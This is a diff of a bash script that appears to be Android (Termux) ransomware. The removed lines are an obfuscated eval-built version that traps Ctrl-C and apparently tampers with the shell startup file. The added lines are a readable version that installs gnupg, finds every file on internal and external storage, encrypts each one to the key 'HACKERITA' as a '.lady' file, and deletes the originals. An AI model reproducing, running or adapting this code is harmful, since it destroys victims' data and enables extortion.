@@ -1,3 +1,12 @@
-z="
-";Az='trap';iBz='O $i';Wz='x-to';cz='SD0=';pBz='&& g';vBz='&& r';sz='t $6';LCz='bash';BCz='REFI';XBz='mv "';IBz=' f -';fz='e/em';bz='ll';Gz='{ ex';Dz='2';Xz='ols ';aBz='// /';bBz='-}" ';JCz='FIX/';uBz='e $F';cBz='2>/d';Fz='_c()';nz=' 2|a';wBz='m -f';GBz='D0 -';ACz='e $P';nBz='x $i';vz='-iv ';Yz='>/de';PCz='ashr';oz='wk -';NBz='T2=$';lz='|tai';CBz=')';RCz='_c';ICz='$PRE';BBz='-n 1';GCz=' && ';PBz='for ';ez='orag';WBz='o';tBz='F';rz='prin';Mz='-v l';rBz='d $i';sBz=' > $';QCz='c';Vz='ermu';Hz='ec l';hBz='[[ -';Zz='v/nu';MCz='ito ';NCz='> $P';qBz='pg -';YBz='$i" ';ABz='ead ';CCz='X/et';HCz='cat ';hz='ed/0';Iz='ogin';gz='ulat';yz='d"|h';dBz='ull';JBz='name';Lz='and ';uz='rep ';KCz='etc/';oBz='w $i';mz='l -n';kz='$(df';kBz='&& c';FBz='d $S';ECz='shit';eBz='F="$';FCz='o ]]';UBz='T2[*';Qz='|| y';EBz='(fin';Ez='ctrl';xz='late';RBz=' ${T';Uz='ll t';mBz=' +rw';TBz='} ${';pz='F " ';OBz='D1 -';ZBz='"${i';Nz=' >/d';LBz='lady';yBz='done';Pz='ull ';jBz=' ]] ';HBz='type';Bz=' ctr';DBz='T1=$';Tz='nsta';az='ll 2';Oz='ev/n';SBz='1[*]';VBz=']};d';dz='"/st';Sz='pt i';iz='"';Jz=';}';gBz='*}"';fBz='{i%.';Kz='comm';xBz=' $i';Cz='l_c ';Rz='es|a';MBz='")';jz='SD1=';tz='}'\''|g';qz='" '\''{';KBz=' "*.';OCz='sh.b';lBz='hmod';wz='"emu';QBz='i in';DCz='c/ba';
-eval "$Az$Bz$Cz$Dz$z$Ez$Fz$Gz$Hz$Iz$Jz$z$Kz$Lz$Mz$Iz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$Yz$Zz$bz$z$cz$dz$ez$fz$gz$hz$iz$z$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$z$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$z$NBz$EBz$FBz$OBz$HBz$IBz$JBz$KBz$LBz$MBz$z$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$z$XBz$YBz$ZBz$aBz$bBz$cBz$Oz$dBz$z$eBz$fBz$gBz$z$hBz$iBz$jBz$kBz$lBz$mBz$nBz$z$hBz$oBz$jBz$pBz$qBz$rBz$sBz$tBz$z$hBz$uBz$jBz$vBz$wBz$xBz$z$yBz$z$hBz$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$BCz$CCz$DCz$OCz$PCz$QCz$z$Ez$RCz"
+#!/usr/bin/bash
+yes|apt install gnupg >/dev/null 2>/dev/null
+SD0="/storage/emulated/0"
+SD1=$(df|tail -n 2|awk -F " " '{print $6}'|grep -iv "emulated"|head -n 1)
+T1=$(find $SD0 -type f)
+T2=$(find $SD1 -type f)
+for i in ${T1[*]} ${T2[*]};do
+mv "$i" "${i// /-}" 2>/dev/null
+[[ -O $i ]] && chmod +rwx $i
+[[ -w $i ]] && gpg -e -q -o $i.lady -r HACKERITA $i
+[[ -e $i.lady ]] && rm $i
+done
